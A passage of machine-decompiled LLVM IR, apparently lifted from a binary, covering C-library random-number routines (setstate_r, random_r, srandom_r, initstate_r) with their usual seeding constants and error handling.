  %v2_10010c8c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10010c8c, i32* @r3, align 4
  %v0_10010ca8 = call i32 @__pthread_return_void()
  %v0_10010cb0 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_1002aa70 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268504260, i32* @lr, align 4
  %v0_10010cc0 = call i32 @srandom_r()
  store i32 %v2_10010c8c, i32* @r3, align 4
  %v0_10010ccc = call i32 @__pthread_return_void()
  ret i32 %v0_10010ccc

; uselistorder directives
  uselistorder i32* @global_var_1002aa70, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002aa70 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_10010ce4 = add i32 %tmp, 12
  %v2_10010ce4 = inttoptr i32 %v1_10010ce4 to i32*
  %v3_10010ce4 = load i32, i32* %v2_10010ce4, align 4
  store i32 %v3_10010ce4, i32* %r11.global-to-local, align 4
  %v0_10010ce8 = load i32, i32* @lr, align 4
  store i32 %v0_10010ce8, i32* %r0.global-to-local, align 4
  %v1_10010cf0 = add i32 %arg1, 4
  store i32 %v1_10010cf0, i32* %r3.global-to-local, align 4
  %v3_10010cf4 = icmp eq i32 %v3_10010ce4, 0
  %v1_10010cf8 = add i32 %tmp, 8
  %v2_10010cf8 = inttoptr i32 %v1_10010cf8 to i32*
  %v3_10010cf8 = load i32, i32* %v2_10010cf8, align 4
  store i32 %v3_10010cf8, i32* %r9.global-to-local, align 4
  br i1 %v3_10010cf4, label %dec_label_pc_10010d04, label %dec_label_pc_10010d0c

dec_label_pc_10010d04:                            ; preds = %entry
  %v2_10010d04 = add i32 %v3_10010cf8, -4
  %v3_10010d04 = inttoptr i32 %v2_10010d04 to i32*
  store i32 0, i32* %v3_10010d04, align 4
  br label %dec_label_pc_10010d24

dec_label_pc_10010d0c:                            ; preds = %entry
  %v1_10010d0c = add i32 %tmp, 4
  %v2_10010d0c = inttoptr i32 %v1_10010d0c to i32*
  %v3_10010d0c = load i32, i32* %v2_10010d0c, align 4
  %v2_10010d10 = sub i32 %v3_10010d0c, %v3_10010cf8
  %v4_10010d14 = sdiv i32 %v2_10010d10, 4
  %v1_10010d18 = mul i32 %v4_10010d14, 5
  %v2_10010d1c = add i32 %v1_10010d18, %v3_10010ce4
  store i32 %v2_10010d1c, i32* %r0.global-to-local, align 4
  %v2_10010d20 = add i32 %v3_10010cf8, -4
  %v3_10010d20 = inttoptr i32 %v2_10010d20 to i32*
  store i32 %v2_10010d1c, i32* %v3_10010d20, align 4
  br label %dec_label_pc_10010d24

dec_label_pc_10010d24:                            ; preds = %dec_label_pc_10010d04, %dec_label_pc_10010d0c
  %v0_10010d24 = load i32, i32* %r3.global-to-local, align 4
  %v1_10010d24 = add i32 %v0_10010d24, -4
  %v2_10010d24 = inttoptr i32 %v1_10010d24 to i32*
  %v3_10010d24 = load i32, i32* %v2_10010d24, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001a228.651 to i32), i32* %r9.global-to-local, align 4
  %v2_10010d34 = srem i32 %v3_10010d24, 5
  store i32 %v2_10010d34, i32* %r11.global-to-local, align 4
  %v2_10010d44 = icmp ugt i32 %v2_10010d34, 4
  %v1_10010d48 = mul nsw i32 %v2_10010d34, 4
  store i32 %v1_10010d48, i32* %r0.global-to-local, align 4
  %v2_10010d50 = add i32 %v1_10010d48, ptrtoint (i32* @global_var_1001a228.651 to i32)
  store i32 %v2_10010d50, i32* %r10.global-to-local, align 4
  br i1 %v2_10010d44, label %dec_label_pc_10010db4, label %dec_label_pc_10010d58

dec_label_pc_10010d58:                            ; preds = %dec_label_pc_10010d24
  %v3_10010d4c = icmp eq i32 %v2_10010d34, 0
  %v1_10010d58 = add i32 %v1_10010d48, add (i32 ptrtoint (i32* @global_var_1001a228.651 to i32), i32 20)
  %v2_10010d58 = inttoptr i32 %v1_10010d58 to i32*
  %v3_10010d58 = load i32, i32* %v2_10010d58, align 4
  store i32 %v3_10010d58, i32* %r10.global-to-local, align 4
  %v3_10010d5c = inttoptr i32 %v2_10010d50 to i32*
  %v4_10010d5c = load i32, i32* %v3_10010d5c, align 4
  store i32 %v4_10010d5c, i32* %r9.global-to-local, align 4
  %v1_10010d60 = mul i32 %v3_10010d58, 4
  store i32 %v1_10010d60, i32* %r0.global-to-local, align 4
  %v2_10010d64 = add i32 %tmp, 16
  %v3_10010d64 = inttoptr i32 %v2_10010d64 to i32*
  store i32 %v3_10010d58, i32* %v3_10010d64, align 4
  %v0_10010d68 = load i32, i32* %r9.global-to-local, align 4
  %v2_10010d68 = add i32 %tmp, 20
  %v3_10010d68 = inttoptr i32 %v2_10010d68 to i32*
  store i32 %v0_10010d68, i32* %v3_10010d68, align 4
  %v0_10010d6c = load i32, i32* %r3.global-to-local, align 4
  %v1_10010d6c = load i32, i32* %r0.global-to-local, align 4
  %v2_10010d6c = add i32 %v1_10010d6c, %v0_10010d6c
  store i32 %v2_10010d6c, i32* %r8.global-to-local, align 4
  %v0_10010d70 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10010d70, i32* %v2_10010ce4, align 4
  br i1 %v3_10010d4c, label %dec_label_pc_10010da8, label %dec_label_pc_10010d78

dec_label_pc_10010d78:                            ; preds = %dec_label_pc_10010d58
  %v0_10010d78 = load i32, i32* %r3.global-to-local, align 4
  %v1_10010d78 = add i32 %v0_10010d78, -4
  %v2_10010d78 = inttoptr i32 %v1_10010d78 to i32*
  %v3_10010d78 = load i32, i32* %v2_10010d78, align 4
  %v1_10010d7c = load i32, i32* %r7.global-to-local, align 4
  %v2_10010d7c = sdiv i32 %v3_10010d78, %v1_10010d7c
  %v1_10010d80 = load i32, i32* %r9.global-to-local, align 4
  %v2_10010d80 = add i32 %v1_10010d80, %v2_10010d7c
  store i32 %v2_10010d80, i32* %r9.global-to-local, align 4
  %v1_10010d84 = mul i32 %v2_10010d7c, 4
  %v1_10010d88 = load i32, i32* %r10.global-to-local, align 4
  %v2_10010d88 = sdiv i32 %v2_10010d80, %v1_10010d88
  store i32 %v2_10010d88, i32* %r11.global-to-local, align 4
  %v2_10010d8c = add i32 %v1_10010d84, %v0_10010d78
  store i32 %v2_10010d8c, i32* %r0.global-to-local, align 4
  %v2_10010d90 = add i32 %tmp, 4
  %v3_10010d90 = inttoptr i32 %v2_10010d90 to i32*
  store i32 %v2_10010d8c, i32* %v3_10010d90, align 4
  %v0_10010d94 = load i32, i32* %r11.global-to-local, align 4
  %v1_10010d94 = load i32, i32* %r10.global-to-local, align 4
  %v2_10010d94 = mul i32 %v1_10010d94, %v0_10010d94
  store i32 %v2_10010d94, i32* %r11.global-to-local, align 4
  %v1_10010d98 = load i32, i32* %r9.global-to-local, align 4
  %v2_10010d98 = sub i32 %v1_10010d98, %v2_10010d94
  %v1_10010d9c = mul i32 %v2_10010d98, 4
  %v0_10010da0 = load i32, i32* %r3.global-to-local, align 4
  %v2_10010da0 = add i32 %v1_10010d9c, %v0_10010da0
  store i32 %v2_10010da0, i32* %r9.global-to-local, align 4
  store i32 %v2_10010da0, i32* %arg2, align 4
  br label %dec_label_pc_10010da8

dec_label_pc_10010da8:                            ; preds = %dec_label_pc_10010d58, %dec_label_pc_10010d78
  %v0_10010da8 = load i32, i32* %r8.global-to-local, align 4
  %v2_10010da8 = add i32 %tmp, 24
  %v3_10010da8 = inttoptr i32 %v2_10010da8 to i32*
  store i32 %v0_10010da8, i32* %v3_10010da8, align 4
  %v0_10010dac = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10010dac, i32* %v2_10010cf8, align 4
  %v0_10010dc8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10010dc4

dec_label_pc_10010db4:                            ; preds = %dec_label_pc_10010d24
  %v0_10010db4 = call i32 @__errno_location()
  store i32 %v0_10010db4, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10010dbc = inttoptr i32 %v0_10010db4 to i32*
  store i32 22, i32* %v2_10010dbc, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10010dc4

dec_label_pc_10010dc4:                            ; preds = %dec_label_pc_10010da8, %dec_label_pc_10010db4
  %v0_10010dc8 = phi i32 [ %v0_10010dc8.pre, %dec_label_pc_10010da8 ], [ -1, %dec_label_pc_10010db4 ]
  store i32 %v0_10010ce8, i32* %r0.global-to-local, align 4
  store i32 %v0_10010dc8, i32* %r3.global-to-local, align 4
  ret i32 %v0_10010dc8

; uselistorder directives
  uselistorder i32 %v0_10010dc8, { 1, 0 }
  uselistorder i32 %v3_10010d58, { 1, 0, 2 }
  uselistorder i32 %v1_10010d48, { 2, 1, 0 }
  uselistorder i32 %v2_10010d34, { 3, 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 3, 6, 2, 5, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 0 }
  uselistorder label %dec_label_pc_10010dc4, { 1, 0 }
  uselistorder label %dec_label_pc_10010da8, { 1, 0 }
  uselistorder label %dec_label_pc_10010d24, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_10010dd8 = add i32 %tmp, 12
  %v2_10010dd8 = inttoptr i32 %v1_10010dd8 to i32*
  %v3_10010dd8 = load i32, i32* %v2_10010dd8, align 4
  %v1_10010de4 = add i32 %tmp, 8
  %v2_10010de4 = inttoptr i32 %v1_10010de4 to i32*
  %v3_10010de4 = load i32, i32* %v2_10010de4, align 4
  store i32 %v3_10010de4, i32* %r7.global-to-local, align 4
  %v3_10010de8 = icmp eq i32 %v3_10010dd8, 0
  br i1 %v3_10010de8, label %dec_label_pc_10010df0, label %dec_label_pc_10010e0c

dec_label_pc_10010df0:                            ; preds = %entry
  %v1_10010df0 = inttoptr i32 %v3_10010de4 to i32*
  %v2_10010df0 = load i32, i32* %v1_10010df0, align 4
  %v2_10010df4 = mul i32 %v2_10010df0, 1103515245
  %v1_10010df8 = add i32 %v2_10010df4, 12345
  %v1_10010dfc = urem i32 %v1_10010df8, -2147483648
  store i32 %v1_10010dfc, i32* %r9.global-to-local, align 4
  store i32 %v1_10010dfc, i32* %v1_10010df0, align 4
  %v0_10010e04 = load i32, i32* %r9.global-to-local, align 4
  %v2_10010e04 = inttoptr i32 %arg2 to i32*
  store i32 %v0_10010e04, i32* %v2_10010e04, align 4
  br label %dec_label_pc_10010e60

dec_label_pc_10010e0c:                            ; preds = %entry
  %v2_10010e0c = load i32, i32* %arg1, align 4
  %v1_10010e10 = add i32 %tmp, 4
  %v2_10010e10 = inttoptr i32 %v1_10010e10 to i32*
  %v3_10010e10 = load i32, i32* %v2_10010e10, align 4
  store i32 %v3_10010e10, i32* %r9.global-to-local, align 4
  %v1_10010e14 = add i32 %tmp, 24
  %v2_10010e14 = inttoptr i32 %v1_10010e14 to i32*
  %v3_10010e14 = load i32, i32* %v2_10010e14, align 4
  %v1_10010e18 = add i32 %v2_10010e0c, 4
  store i32 %v1_10010e18, i32* %r8.global-to-local, align 4
  %v1_10010e1c = add i32 %v3_10010e10, 4
  %v1_10010e20 = inttoptr i32 %v3_10010e10 to i32*
  %v2_10010e20 = load i32, i32* %v1_10010e20, align 4
  store i32 %v2_10010e20, i32* %r9.global-to-local, align 4
  %v2_10010e24 = icmp ult i32 %v1_10010e18, %v3_10010e14
  %v1_10010e2c = inttoptr i32 %v2_10010e0c to i32*
  %v2_10010e2c = load i32, i32* %v1_10010e2c, align 4
  store i32 %v1_10010e1c, i32* %r10.global-to-local, align 4
  %v2_10010e34 = add i32 %v2_10010e2c, %v2_10010e20
  %v1_10010e38 = udiv i32 %v2_10010e34, 2
  store i32 %v1_10010e38, i32* %r9.global-to-local, align 4
  store i32 %v2_10010e34, i32* %v1_10010e2c, align 4
  %v0_10010e40 = load i32, i32* %r9.global-to-local, align 4
  %v2_10010e40 = inttoptr i32 %arg2 to i32*
  store i32 %v0_10010e40, i32* %v2_10010e40, align 4
  br i1 %v2_10010e24, label %dec_label_pc_10010e50, label %dec_label_pc_10010e48

dec_label_pc_10010e48:                            ; preds = %dec_label_pc_10010e0c
  %v0_10010e48 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10010e48, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10010e58

dec_label_pc_10010e50:                            ; preds = %dec_label_pc_10010e0c
  %v2_10010e28 = icmp ult i32 %v1_10010e1c, %v3_10010e14
  br i1 %v2_10010e28, label %dec_label_pc_10010e58, label %dec_label_pc_10010e54

dec_label_pc_10010e54:                            ; preds = %dec_label_pc_10010e50
  %v0_10010e54 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10010e54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10010e58

dec_label_pc_10010e58:                            ; preds = %dec_label_pc_10010e50, %dec_label_pc_10010e48, %dec_label_pc_10010e54
  %v0_10010e58 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10010e58, i32* %v2_10010e10, align 4
  %v0_10010e5c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10010e5c, i32* %arg1, align 4
  br label %dec_label_pc_10010e60

dec_label_pc_10010e60:                            ; preds = %dec_label_pc_10010df0, %dec_label_pc_10010e58
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10010e34, { 1, 0 }
  uselistorder i32 %v1_10010e1c, { 1, 0 }
  uselistorder i32 %v3_10010e10, { 1, 0, 2 }
  uselistorder i32 %v1_10010dfc, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10010e60, { 1, 0 }
  uselistorder label %dec_label_pc_10010e58, { 2, 0, 1 }
}

define i32 @srandom_r() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10010e68 = load i32, i32* @lr, align 4
  %v0_10010e74 = load i32, i32* @r4, align 4
  store i32 %v0_10010e74, i32* @r30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_10010e80 = add i32 %v0_10010e74, 12
  %v2_10010e80 = inttoptr i32 %v1_10010e80 to i32*
  %v3_10010e80 = load i32, i32* %v2_10010e80, align 4
  %v2_10010e84 = icmp ugt i32 %v3_10010e80, 4
  br i1 %v2_10010e84, label %dec_label_pc_10010f34, label %dec_label_pc_10010e8c

dec_label_pc_10010e8c:                            ; preds = %entry
  %v0_10010e8c = load i32, i32* @r3, align 4
  %v3_10010e8c = icmp eq i32 %v0_10010e8c, 0
  %v1_10010e90 = add i32 %v0_10010e74, 8
  %v2_10010e90 = inttoptr i32 %v1_10010e90 to i32*
  %v3_10010e90 = load i32, i32* %v2_10010e90, align 4
  store i32 %v3_10010e90, i32* %r10.global-to-local, align 4
  br i1 %v3_10010e8c, label %dec_label_pc_10010e98, label %dec_label_pc_10010e9c

dec_label_pc_10010e98:                            ; preds = %dec_label_pc_10010e8c
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_10010e9c

dec_label_pc_10010e9c:                            ; preds = %dec_label_pc_10010e8c, %dec_label_pc_10010e98
  %v0_10010ea0 = phi i32 [ %v0_10010e8c, %dec_label_pc_10010e8c ], [ 1, %dec_label_pc_10010e98 ]
  %v3_10010e9c = icmp eq i32 %v3_10010e80, 0
  %v2_10010ea0 = inttoptr i32 %v3_10010e90 to i32*
  store i32 %v0_10010ea0, i32* %v2_10010ea0, align 4
  br i1 %v3_10010e9c, label %dec_label_pc_10010f30, label %dec_label_pc_10010ea8

dec_label_pc_10010ea8:                            ; preds = %dec_label_pc_10010e9c
  %v0_10010ea8 = load i32, i32* @r30, align 4
  %v1_10010ea8 = add i32 %v0_10010ea8, 16
  %v2_10010ea8 = inttoptr i32 %v1_10010ea8 to i32*
  %v3_10010ea8 = load i32, i32* %v2_10010ea8, align 4
  store i32 %v3_10010ea8, i32* %r11.global-to-local, align 4
  store i32 127773, i32* %r8.global-to-local, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_10010ec0 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v3_10010ea8, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_10010ea8, 0
  br i1 %tmp18, label %dec_label_pc_10010efc.preheader, label %dec_label_pc_10010efc.preheader.thread

dec_label_pc_10010efc.preheader.thread:           ; preds = %dec_label_pc_10010ea8
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10010f00

dec_label_pc_10010efc.preheader:                  ; preds = %dec_label_pc_10010ea8
  %v1_10010efc2 = add i32 %v3_10010ea8, -1
  store i32 %v1_10010efc2, i32* %ctr.global-to-local, align 4
  %v2_10010efc3 = icmp eq i32 %v1_10010efc2, 0
  br i1 %v2_10010efc3, label %dec_label_pc_10010f00, label %dec_label_pc_10010ed8

dec_label_pc_10010ed8:                            ; preds = %dec_label_pc_10010efc.preheader, %dec_label_pc_10010ef8.dec_label_pc_10010ed8_crit_edge
  %v1_10010ef8 = phi i32 [ %v2_10010ef8, %dec_label_pc_10010ef8.dec_label_pc_10010ed8_crit_edge ], [ %v0_10010ec0, %dec_label_pc_10010efc.preheader ]
  %v1_10010ed8 = phi i32 [ %v1_10010ed8.pre, %dec_label_pc_10010ef8.dec_label_pc_10010ed8_crit_edge ], [ 127773, %dec_label_pc_10010efc.preheader ]
  %v0_10010ed8 = load i32, i32* @r3, align 4
  %v2_10010ed8 = sdiv i32 %v0_10010ed8, %v1_10010ed8
  %v2_10010edc = mul i32 %v2_10010ed8, %v1_10010ed8
  %v2_10010ee0 = sub i32 %v0_10010ed8, %v2_10010edc
  %v1_10010ee4 = mul i32 %v2_10010ed8, 2836
  store i32 %v1_10010ee4, i32* %r0.global-to-local, align 4
  %v1_10010ee8 = mul i32 %v2_10010ee0, 16807
  %v2_10010eec = sub i32 %v1_10010ee8, %v1_10010ee4
  store i32 %v2_10010eec, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_10010eec, -1
  br i1 %tmp19, label %dec_label_pc_10010ef8, label %dec_label_pc_10010ef4

dec_label_pc_10010ef4:                            ; preds = %dec_label_pc_10010ed8
  %v1_10010ef4 = load i32, i32* %r7.global-to-local, align 4
  %v2_10010ef4 = add i32 %v1_10010ef4, %v2_10010eec
  store i32 %v2_10010ef4, i32* @r3, align 4
  br label %dec_label_pc_10010ef8

dec_label_pc_10010ef8:                            ; preds = %dec_label_pc_10010ed8, %dec_label_pc_10010ef4
  %v0_10010ef8 = phi i32 [ %v2_10010eec, %dec_label_pc_10010ed8 ], [ %v2_10010ef4, %dec_label_pc_10010ef4 ]
  %v2_10010ef8 = add i32 %v1_10010ef8, 4
  %v3_10010ef8 = inttoptr i32 %v2_10010ef8 to i32*
  store i32 %v0_10010ef8, i32* %v3_10010ef8, align 4
  %v0_10010efc = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010efc = add i32 %v0_10010efc, -1
  store i32 %v1_10010efc, i32* %ctr.global-to-local, align 4
  %v2_10010efc = icmp eq i32 %v1_10010efc, 0
  br i1 %v2_10010efc, label %dec_label_pc_10010efc.dec_label_pc_10010f00_crit_edge, label %dec_label_pc_10010ef8.dec_label_pc_10010ed8_crit_edge

dec_label_pc_10010ef8.dec_label_pc_10010ed8_crit_edge: ; preds = %dec_label_pc_10010ef8
  %v1_10010ed8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10010ed8

dec_label_pc_10010efc.dec_label_pc_10010f00_crit_edge: ; preds = %dec_label_pc_10010ef8
  %v0_10010f00.pre = load i32, i32* @r30, align 4
  %v0_10010f04.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_10010f08.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10010f00

dec_label_pc_10010f00:                            ; preds = %dec_label_pc_10010efc.preheader.thread, %dec_label_pc_10010efc.dec_label_pc_10010f00_crit_edge, %dec_label_pc_10010efc.preheader
  %v0_10010f08 = phi i32 [ %v0_10010f08.pre, %dec_label_pc_10010efc.dec_label_pc_10010f00_crit_edge ], [ %v0_10010ec0, %dec_label_pc_10010efc.preheader ], [ %v0_10010ec0, %dec_label_pc_10010efc.preheader.thread ]
  %v0_10010f04 = phi i32 [ %v0_10010f04.pre, %dec_label_pc_10010efc.dec_label_pc_10010f00_crit_edge ], [ %v3_10010ea8, %dec_label_pc_10010efc.preheader ], [ %v3_10010ea8, %dec_label_pc_10010efc.preheader.thread ]
  %v1_10010f08 = phi i32 [ %v0_10010f00.pre, %dec_label_pc_10010efc.dec_label_pc_10010f00_crit_edge ], [ %v0_10010ea8, %dec_label_pc_10010efc.preheader ], [ %v0_10010ea8, %dec_label_pc_10010efc.preheader.thread ]
  %v1_10010f00 = add i32 %v1_10010f08, 20
  %v2_10010f00 = inttoptr i32 %v1_10010f00 to i32*
  %v3_10010f00 = load i32, i32* %v2_10010f00, align 4
  store i32 %v3_10010f00, i32* %r0.global-to-local, align 4
  %v1_10010f04 = mul i32 %v0_10010f04, 10
  store i32 %v1_10010f04, i32* %r31.global-to-local, align 4
  %v2_10010f08 = add i32 %v1_10010f08, 4
  %v3_10010f08 = inttoptr i32 %v2_10010f08 to i32*
  store i32 %v0_10010f08, i32* %v3_10010f08, align 4
  %v0_10010f0c = load i32, i32* %r0.global-to-local, align 4
  %v1_10010f0c = mul i32 %v0_10010f0c, 4
  %v0_10010f10 = load i32, i32* %r10.global-to-local, align 4
  %v2_10010f10 = add i32 %v0_10010f10, %v1_10010f0c
  store i32 %v2_10010f10, i32* %r0.global-to-local, align 4
  %v1_10010f14 = load i32, i32* @r30, align 4
  %v2_10010f14 = inttoptr i32 %v1_10010f14 to i32*
  store i32 %v2_10010f10, i32* %v2_10010f14, align 4
  %v2_10010f28 = ptrtoint i32* %stack_var_-24 to i32
  %v0_10010f2021 = load i32, i32* %r31.global-to-local, align 4
  %v1_10010f2022 = add i32 %v0_10010f2021, -1
  store i32 %v1_10010f2022, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_10010f2022, -1
  br i1 %tmp2025, label %dec_label_pc_10010f1c, label %dec_label_pc_10010f30

dec_label_pc_10010f1c:                            ; preds = %dec_label_pc_10010f00, %dec_label_pc_10010f1c
  %v0_10010f2426 = load i32, i32* @r30, align 4
  %v2_10010f1c = inttoptr i32 %v0_10010f2426 to i32*
  %v3_10010f1c = call i32 @__GI_random_r(i32* %v2_10010f1c, i32 %v2_10010f28)
  %v0_10010f20 = load i32, i32* @r31, align 4
  %v1_10010f20 = add i32 %v0_10010f20, -1
  store i32 %v1_10010f20, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_10010f20, -1
  br i1 %tmp20, label %dec_label_pc_10010f1c, label %dec_label_pc_10010f30

dec_label_pc_10010f30:                            ; preds = %dec_label_pc_10010f00, %dec_label_pc_10010f1c, %dec_label_pc_10010e9c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10010f34

dec_label_pc_10010f34:                            ; preds = %entry, %dec_label_pc_10010f30
  %v0_10010f34 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_10010f30 ]
  store i32 %v0_10010e68, i32* %r0.global-to-local, align 4
  ret i32 %v0_10010f34

; uselistorder directives
  uselistorder i32 %v1_10010efc, { 1, 0 }
  uselistorder i32 %v2_10010ef8, { 1, 0 }
  uselistorder i32 %v2_10010eec, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10010ed8, { 1, 0 }
  uselistorder i32 %v0_10010ec0, { 1, 2, 0 }
  uselistorder i32 %v3_10010ea8, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r10.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 3, 4, 1 }
  uselistorder label %dec_label_pc_10010f34, { 1, 0 }
  uselistorder label %dec_label_pc_10010f30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10010f1c, { 1, 0 }
  uselistorder label %dec_label_pc_10010f00, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10010ef8, { 1, 0 }
  uselistorder label %dec_label_pc_10010ed8, { 1, 0 }
  uselistorder label %dec_label_pc_10010e9c, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_10010f4c = icmp ugt i32 %arg2, 127
  %v0_10010f54 = load i32, i32* @lr, align 4
  store i32 %v0_10010f54, i32* %r0.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v1_10010f60 = sub i32 255, %arg2
  %v2_10010f60 = sub i32 -1, %arg2
  %not.v5_10010f60 = icmp ugt i32 %v1_10010f60, %v2_10010f60
  %v6_10010f64 = sext i1 %not.v5_10010f60 to i32
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_10010f6c = add i32 %tmp, 4
  store i32 %v1_10010f6c, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001a228.651 to i32), i32* %r11.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_10010f84 = sub nsw i32 3, %v6_10010f64
  store i32 %v1_10010f84, i32* @r31, align 4
  br i1 %v2_10010f4c, label %dec_label_pc_10010fac, label %dec_label_pc_10010f8c

dec_label_pc_10010f8c:                            ; preds = %entry
  %v2_10010f78 = icmp ugt i32 %arg2, 31
  %v1_10010f8c = sub i32 63, %arg2
  %not.v5_10010f8c = icmp ugt i32 %v1_10010f8c, %v2_10010f60
  %v6_10010f90 = sext i1 %not.v5_10010f8c to i32
  %v1_10010f98 = sub nsw i32 1, %v6_10010f90
  store i32 %v1_10010f98, i32* @r31, align 4
  br i1 %v2_10010f78, label %dec_label_pc_10010fac, label %dec_label_pc_10010fa0

dec_label_pc_10010fa0:                            ; preds = %dec_label_pc_10010f8c
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp5 = icmp ult i32 %arg2, 8
  br i1 %tmp5, label %dec_label_pc_1001100c, label %dec_label_pc_10010fac

dec_label_pc_10010fac:                            ; preds = %dec_label_pc_10010fa0, %dec_label_pc_10010f8c, %entry
  %v0_10010fac = phi i32 [ 0, %dec_label_pc_10010fa0 ], [ %v1_10010f98, %dec_label_pc_10010f8c ], [ %v1_10010f84, %entry ]
  %v1_10010fac = mul nsw i32 %v0_10010fac, 4
  store i32 %v1_10010fac, i32* %r0.global-to-local, align 4
  %v2_10010fb0 = add i32 %arg3, 12
  %v3_10010fb0 = inttoptr i32 %v2_10010fb0 to i32*
  store i32 %v0_10010fac, i32* %v3_10010fb0, align 4
  %v0_10010fb4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010fb4 = load i32, i32* %r11.global-to-local, align 4
  %v2_10010fb4 = add i32 %v1_10010fb4, %v0_10010fb4
  store i32 %v2_10010fb4, i32* %r9.global-to-local, align 4
  %v3_10010fb8 = inttoptr i32 %v2_10010fb4 to i32*
  %v4_10010fb8 = load i32, i32* %v3_10010fb8, align 4
  store i32 %v4_10010fb8, i32* %r0.global-to-local, align 4
  %v1_10010fbc = add i32 %v2_10010fb4, 20
  %v2_10010fbc = inttoptr i32 %v1_10010fbc to i32*
  %v3_10010fbc = load i32, i32* %v2_10010fbc, align 4
  store i32 %v3_10010fbc, i32* %r9.global-to-local, align 4
  %v1_10010fc0 = load i32, i32* %r30.global-to-local, align 4
  %v2_10010fc0 = add i32 %v1_10010fc0, 20
  %v3_10010fc0 = inttoptr i32 %v2_10010fc0 to i32*
  store i32 %v4_10010fb8, i32* %v3_10010fc0, align 4
  %v0_10010fc4 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010fc4 = mul i32 %v0_10010fc4, 4
  store i32 %v1_10010fc4, i32* %r0.global-to-local, align 4
  %v0_10010fc8 = load i32, i32* %r29.global-to-local, align 4
  %v1_10010fc8 = load i32, i32* %r30.global-to-local, align 4
  %v2_10010fc8 = add i32 %v1_10010fc8, 8
  %v3_10010fc8 = inttoptr i32 %v2_10010fc8 to i32*
